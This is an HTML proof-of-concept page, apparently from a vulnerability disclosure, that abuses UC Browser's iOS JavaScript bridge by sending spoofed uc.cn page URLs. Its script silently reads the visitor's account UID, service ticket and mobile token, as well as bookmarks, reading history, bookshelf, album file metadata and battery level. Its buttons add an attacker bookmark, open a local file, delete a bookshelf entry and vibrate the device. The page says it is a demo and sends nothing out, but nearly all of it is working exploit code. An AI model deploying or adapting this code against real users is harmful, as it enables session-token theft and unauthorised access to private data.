<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
    <style>
        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        .container {
            width: 100%;
            padding: 15px;
        }

        @media screen and (min-width: 700px) {
            .container {
                width: 70%;
                margin: auto;
            }
        }

        p {
            white-space: pre-wrap; 
            word-wrap: break-word; 
            overflow-wrap: break-word; 
        }

        .bold-and-larger {
            font-weight: bold; 
            font-size: 1.5em; 
        }

        .larger {
            font-weight: bold; 
            font-size: 1.2em; 
        }

    </style>
    <title>Malicious Page</title>

</head>


<body>
    <h1>Malicious Page</h1>

    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>

    <p><span class="bold-and-larger">An attacker can:</span></p>

    <p><span class="larger">Get Your UC Account Info:</span></p>
    <p style="font-size: 15px;" id="AccountNickname"></p>
    <p style="font-size: 15px;" id="AccountAvatarText">Your UC Avatar: </p>
    <div class="image-with-text">
        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
    </div>
    <p style="font-size: 15px;" id="AccountUid"></p>
    <p style="font-size: 15px;" id="AccountTicket"></p> 
    <p style="font-size: 15px;" id="AccountMobileWG"></p> 

    <p><span class="larger">Get Your Device Info:</span></p>
    <p style="font-size: 15px;" id="Battery"></p>

    <p><span class="larger">Get your BookMark List:</span></p>
    <p style="font-size: 15px;" id="BookMarkList"></p>

    <p><span class="larger">Add BookMarks to your browser:</span></p>
    Will add the following Bookmark to your browser:<br>
        url: "https://zhouziyi1.github.io",<br>
        title: "[attacker added] Bookmark page"
    <input type="button" value="Add BookMark" id="AddBookMark" style="font-size: 20px; padding: 20px 25px;"/>

    <p><span class="larger">Open Local File on your phone:</span></p>
    Will open the following file on your phone:<br>
    "/private/var/mobile/Documents/localPDF.pdf"
    <input type="button" value="Open Local File" id="OpenFile" style="font-size: 20px; padding: 20px 25px;"/>

    <p><span class="larger">Get Your Novel Reading Record:</span></p>
    <p style="font-size: 15px;" id="NovelRecord"></p>

    <p><span class="larger">Get Your Novel BookShelf Info:</span></p>
    <p style="font-size: 15px;" id="NovelBookShelf"></p>

    <p><span class="larger">Remove Novel from Your BookShelf:</span></p>
    Will remove the following novel from your bookshelf:<br>
    <p>{"cover_url":"http://img-tailor.11222.cn/bcv/big/1154147955743_sa.jpg","author":"微微鸿气","is_finish":0,"category":"","iflow":{"title":""},"book_id":"7955743","type":"shuqi","book_name":"鸿蒙天帝","tags":""}</p>
    <input type="button" value="Remove Novel" id="RemoveNovel" style="font-size: 20px; padding: 20px 25px;"/>

    <p><span class="larger">Vibrate Your Device:</span></p>
    <input type="button" value="Vibrate Device" id="VibrateDevice" style="font-size: 20px; padding: 20px 25px;"/>

    <script>
        
    var r = +new Date;
    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "account.getUserInfo",
        methodParams: {vCode: r},
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;

        var AccountNickname = json.nickname;
        document.getElementById("AccountNickname").innerText = "Your UC Account Nickname: " + AccountNickname;

        var Avatar = json.avatar_url;
        document.getElementById("AccountAvatar").src = Avatar;
        
        var AccountUid = json.uId;
        document.getElementById("AccountUid").innerText = "Your UC Account UID: " + AccountUid;

        var AccountTicket = json.service_ticket;
        document.getElementById("AccountTicket").innerText = "Your UC Account Ticket: " + AccountTicket;

        var AccountMobileWG = json.mobile_wg;
        document.getElementById("AccountMobileWG").innerText = "Your UC Account Mobile_wg: " + AccountMobileWG;
    });

    document.getElementById("AddBookMark").onclick = function () {
        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
            invokeId: "callback",
            methodName: "base.addBookmark",
            methodParams: {
                url: "https://zhouziyi1.github.io",
                title: "[attacker added] Bookmark page"
            },
            pageURL: "https://www.uc.cn/",
            windowId: window.ucapi.windowId
        }).then(function(a) {
        });
    }

    var r = +new Date;
    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "base.getBookmarkList",
        methodParams: {
            begin_index: 0,
            count: 100
        },
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;

        var BookMarkNum = json.total_count;
        const jsonData = json.list;
        const bookmarkListElement = document.getElementById("BookMarkList");
        bookmarkListElement.innerText = "Your BookMark List: \n\n" + "Total Count: " + BookMarkNum + "\n\n";
        jsonData.forEach(bookmark => {
            const bookmarkText = JSON.stringify(bookmark);
            bookmarkListElement.innerText += bookmarkText + '\n\n';
        });

    });

    document.getElementById("OpenFile").onclick = function () {
        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
            invokeId: "callback",
            methodName: "base.openLocalFile",
            methodParams: {
                file_uri: "/private/var/mobile/Documents/localPDF.pdf",
                by_system: 0
            },
            pageURL: "https://www.uc.cn/",
            windowId: window.ucapi.windowId
        }).then(function(a) {
        });
    }


    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "clouddrive.getAlbumFileInfo",
        methodParams: {
        },
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;
        
        const albumInfoElement = document.getElementById("AlbumInfo");
        let count = 0;
        json.files.forEach(file => {
            if (count < 5) {
                const fileEntry = document.createElement('p');
                fileEntry.innerText = `Height: ${file.height}, Width: ${file.width}, Media Type: ${file.media_type}, Local Identity: ${file.local_identity}`;
                albumInfoElement.appendChild(fileEntry);
                count++;
            }
        });
        const ellipsis = document.createElement('p');
        ellipsis.innerText = "(only show first 5) ............";
        albumInfoElement.appendChild(ellipsis);
    });

    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "device.batteryLevel",
        methodParams: {
        },
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;

        var level = json.level;
        document.getElementById("Battery").innerText = "Your Device Battery Level: \n" + level + "%";
    });

    function convertToGB(bytes) {
        var sizeInBytes = parseInt(bytes);
        var sizeInGB = sizeInBytes / (1024 * 1024 * 1024);
        return sizeInGB.toFixed(2) + "GB";
    }


    document.getElementById("VibrateDevice").onclick = function () {
        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
            invokeId: "callback",
            methodName: "device.vibrate",
            methodParams: {
            },
            pageURL: "https://www.uc.cn/",
            windowId: window.ucapi.windowId
        }).then(function(a) {
        });
    }
    
    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "novel.getReadRecords",
        methodParams: {
        },
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;
        
        const jsonData = json.data;
        const NovelRecordElement = document.getElementById("NovelRecord");
        jsonData.forEach(NovelRecord => {
            const NovelRecordText = JSON.stringify(NovelRecord);
            NovelRecordElement.innerText += NovelRecordText + '\n\n';
        });
    });    

    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
        invokeId: "callback",
        methodName: "novel.queryAllOnlineBook",
        methodParams: {
        },
        pageURL: "https://www.uc.cn/",
        windowId: window.ucapi.windowId
    }).then(function(a) {
        var json = a;
        
        const jsonData = json.books;
        const NovelBookShelfElement = document.getElementById("NovelBookShelf");
        jsonData.forEach(NovelBookShelf => {
            const NovelBookShelfText = JSON.stringify(NovelBookShelf);
            NovelBookShelfElement.innerText += NovelBookShelfText + '\n\n';
        });
    });

    document.getElementById("RemoveNovel").onclick = function () {
        window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
            invokeId: "callback",
            methodName: "novel.removeFromBookshelf",
            methodParams: {
                book_id:"7955743"
            },
            pageURL: "https://www.uc.cn/",
            windowId: window.ucapi.windowId
        }).then(function(a) {
        });
    }

    </script>

</body>

</html>